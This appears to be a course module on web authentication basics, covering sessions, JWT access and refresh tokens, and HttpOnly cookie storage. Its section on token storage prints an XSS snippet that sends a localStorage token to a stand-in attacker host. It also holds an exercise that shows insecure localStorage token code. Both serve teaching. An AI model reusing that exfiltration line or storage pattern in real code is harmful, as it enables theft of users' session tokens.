# M0: Authentication Foundations — The Complete Mental Model

**Track:** Core Curriculum  
**Prerequisites:** None — Start here.  
**Time:** ~1 hour  

---

> **Multi-client note:** Browser examples in this curriculum use `HttpOnly`
> cookies. Mobile, desktop, Postman, curl, and SDK clients use the same token
> lifecycle with explicit Bearer-token transport. See
> [`docs/multi-client-api.md`](../multi-client-api.md).

## Why This Document Exists

Every experienced engineer has seen codebases where authentication was bolted on as an afterthought. Tokens stored in `localStorage`. Sessions that never expire. Role checks done only on the frontend. These are not "beginner mistakes" — they are the result of learning *how* to do authentication without learning *why*.

This milestone gives you the *why*. Every design decision in this codebase flows directly from the principles in this document.

---

## 1. Authentication vs Authorization

These terms are used interchangeably in casual conversation. They mean completely different things.

| Term | Question Answered | Example |
|------|-----------------|---------|
| **Authentication (AuthN)** | Who are you? | "I am Tauhid. Here is my password." |
| **Authorization (AuthZ)** | What can you do? | "Tauhid is logged in. Is he allowed to delete this user?" |

**The critical insight:** Authorization requires Authentication first. You cannot check what someone is allowed to do until you know who they are.

*Analogy: At an airport, the passport check is Authentication. The boarding pass check at the gate is Authorization (you can't board flight AA123 even with a valid passport if you don't have a ticket for that specific flight).*

---

## 2. The HTTP Stateless Problem

HTTP is a stateless protocol. Each HTTP request is completely independent. The server has zero memory of previous requests from the same client.

When you log in:
```http
POST /api/auth/login
{ "email": "tauhid@example.com", "password": "..." }

→ 200 OK ✅
```

Immediately after, you make a request to a protected route:
```http
GET /api/users/me

→ 401 Unauthorized ❌ (The server has no idea who you are!)
```

**The fundamental problem of authentication in web applications is: how do we carry proof of identity across stateless HTTP requests?**

There are two families of solutions.

---

## 3. Solution A: Stateful Sessions (The Traditional Way)

1. User logs in. Server verifies password.
2. Server creates a **Session Record** in the database: `{ id: "session_abc123", userId: "user_456", expiresAt: ... }`.
3. Server sets a cookie in the browser: `session_id=session_abc123`.
4. On every subsequent request, the browser sends the cookie automatically.
5. The server looks up `session_abc123` in the database to find the user.

### Pros
- Easy to revoke: just delete the session record from the DB.
- Session data can be large (you can store anything in the DB row).

### Cons
- **Database query on every request.** This is expensive at scale. A site with 100,000 concurrent users makes 100,000 extra DB queries per second just for authentication.
- **Sticky sessions** or **session sharing** required when scaling to multiple servers. Server A's in-memory session doesn't exist on Server B.

---

## 4. Solution B: Stateless Tokens (The Modern SaaS Way)

1. User logs in. Server verifies password.
2. Server generates a **JSON Web Token (JWT)** — a signed JSON object containing the user's ID and role.
3. Server gives the browser the JWT (in a cookie or response body).
4. On every subsequent request, the browser sends the JWT.
5. The server verifies the JWT's **cryptographic signature**. No DB lookup needed.

### Pros
- **Zero database queries for authentication.** Verification is pure math.
- Stateless and horizontally scalable by nature. Any server with the same secret can verify any token.

### Cons
- **Cannot be revoked before expiry.** If a JWT is stolen and has a 24-hour lifetime, the attacker has 24 hours of unrevokable access.

---

## 5. The Token Pair Architecture (What We Build)

To get the best of both worlds — stateless verification + the ability to revoke — modern systems use **two tokens working together**.

### Access Token
| Property | Value |
|----------|-------|
| Type | JWT (signed) |
| Lifespan | **5 minutes** |
| Storage | `HttpOnly` Cookie |
| Purpose | Prove identity on every API request |
| Revokable? | ❌ No (by design — its short life is the "revocation") |

### Refresh Token
| Property | Value |
|----------|-------|
| Type | Opaque random string (64 bytes) |
| Lifespan | **30 days** |
| Storage | Database (hashed) + `HttpOnly` Cookie |
| Purpose | Only used to get a new Access Token |
| Revokable? | ✅ Yes — just mark `isRevoked: true` in DB |

### The Silent Refresh Flow
```ascii
Browser                     Express API                 Database
   │                             │                          │
   │  GET /api/users/me          │                          │
   │  + access_token cookie      │                          │
   ├────────────────────────────►│                          │
   │                             │ jwt.verify() fails:      │
   │  ← 401 TOKEN_EXPIRED        │ token is 5 min old       │
   │                             │                          │
   │  POST /api/auth/refresh     │                          │
   │  + refresh_token cookie     │                          │
   ├────────────────────────────►│                          │
   │                             │ SELECT * FROM sessions   │
   │                             ├─────────────────────────►│
   │                             │ ← Session found, valid   │
   │                             │                          │
   │                             │ Rotate: mark old revoked │
   │                             ├─────────────────────────►│
   │  ← 200 + new access_token   │ INSERT new session row   │
   │                             │                          │
   │  GET /api/users/me (RETRY)  │                          │
   │  + NEW access_token cookie  │                          │
   ├────────────────────────────►│                          │
   │  ← 200 User Data ✅         │                          │
```

The user sees none of this. Their app simply loads data normally.

---

## 6. Token Storage: The Golden Rule

> [!CAUTION]
> **NEVER store tokens in `localStorage` or `sessionStorage`.** 

### Why localStorage is Dangerous
`localStorage` is readable by any JavaScript code running on the page. If your site has even one Cross-Site Scripting (XSS) vulnerability — whether in your own code, a library you use, or a user-generated content field — an attacker can execute:

```javascript
// Malicious script injected via XSS
fetch('https://attacker.example.com/collect', {
  method: 'POST',
  body: localStorage.getItem('access_token')
});
```

Your token is gone. The attacker now has full access to your user's account.

### Why HttpOnly Cookies are Safe
```http
Set-Cookie: access_token=eyJhbGci...; HttpOnly; Secure; SameSite=Lax
```

- `HttpOnly`: JavaScript **cannot** read this cookie. `document.cookie` will not show it. DevTools Application tab will show it as `HttpOnly`. XSS attacks cannot steal it.
- `Secure`: Only sent over HTTPS connections.
- `SameSite=Lax`: Only sent on same-site requests and top-level navigation, blocking CSRF attacks from third-party sites.

---

## 7. The Real-World Architecture of This System

```ascii
┌──────────────────────────────────────────────────────────────────┐
│                          BROWSER                                 │
│                                                                  │
│  React UI  ─────────────────────────────────  HttpOnly Cookie   │
│  (reads user from memory/props)                (token vault)    │
└──────────────────────────┬───────────────────────────────────────┘
                           │ HTTP Requests (cookie auto-attached)
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│                       NEXT.JS SERVER                             │
│                                                                  │
│  Server Components ──── authFetchServer() ─── Cookie Forwarding │
│  middleware.ts ─────────────────────────────── UX Routing       │
└──────────────────────────┬───────────────────────────────────────┘
                           │ HTTP Requests (cookie forwarded)
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│                       EXPRESS API                                │
│                                                                  │
│  authenticate middleware ──── jwt.verify() ──── No DB lookup    │
│  requireRole middleware ────── req.user.role ── RBAC check      │
│  auth routes ──────────────── bcrypt + JWT  ─── Token issuance  │
└──────────────────────────┬───────────────────────────────────────┘
                           │ Prisma ORM queries
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│                       POSTGRESQL DATABASE                        │
│                                                                  │
│  users table ─── (id, email, passwordHash, role)                │
│  sessions table ─ (id, userId, tokenHash, isRevoked)            │
└──────────────────────────────────────────────────────────────────┘
```

---

## Practice Exercises

1. **Explain it out loud:** Without looking at the document, explain the difference between an Access Token and a Refresh Token to an imaginary junior developer. Cover: lifespan, storage location, purpose, and revokeability.
2. **Spot the vulnerability:** Review the following hypothetical code. Identify all the security problems:
   ```javascript
   const token = await loginUser(email, password);
   localStorage.setItem("token", token); // Is this safe?
   // Later...
   fetch("/api/dashboard", {
     headers: { Authorization: `Bearer ${localStorage.getItem("token")}` }
   });
   ```
3. **Trace the architecture:** Open DevTools on any page of this app. Go to Application → Cookies. Confirm the token is `HttpOnly`. Then open the Console and run `document.cookie`. Verify the token is not visible there.
